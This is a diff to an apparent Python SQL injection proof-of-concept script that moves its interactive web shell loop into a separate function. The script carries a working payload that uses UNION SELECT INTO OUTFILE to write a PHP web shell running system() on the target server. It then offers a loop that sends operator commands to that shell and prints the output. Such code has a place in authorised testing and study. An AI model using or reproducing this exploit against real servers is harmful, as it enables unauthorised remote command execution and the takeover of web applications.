@@ -47,6 +47,26 @@ def exploit(url, param, payload):
 
     return True
 
+def shell_mode(url, param, payload):
+    if exploit(url, param, payload):
+        print("[+] Webshell successfully uploaded. Entering shell mode...\n")
+        while True:
+            shell = input("$ ")
+            web_shell = f"{url}/cmd.php?cmd="
+            full_url = web_shell + shell
+
+            try:
+                response = requests.get(full_url)
+                print(response.text)
+                continue
+
+            except requests.RequestException as e:
+                print(f"[-] Error: {e}\n")
+                break
+
+    else:
+        print("[-] Webshell not uploaded. Check output.txt for analysis...")
+
 def main():
     parser = argparse.ArgumentParser(description="SQL Injection PoC")
     parser.add_argument("url", help="Vulnerable URL (e.g. https://example.com/vulnerable_uri)")
@@ -68,25 +88,8 @@ def main():
 
     print("[+] Attempting to upload shell to server...\n")
     payload = "' union select 1, '<?php system($_GET[\"cmd\"]); ?>' into outfile './cmd.php' #"
-
-    if exploit(url, args.param, payload):
-        print("[+] Webshell successfully uploaded. Entering shell mode...\n")
-        while True:
-            shell = input("$ ")
-            web_shell = f"{url}/cmd.php?cmd="
-            full_url = web_shell + shell
-
-            try:
-                response = requests.get(full_url)
-                print(response.text)
-                continue
-
-            except requests.RequestException as e:
-                print(f"[-] Error: {e}\n")
-                break
-
-    else:
-        print("[-] Webshell not uploaded. Check output.txt for analysis...")
+    shell_mode(url, args.param, payload)
 
 if __name__ == "__main__":
     main()
+
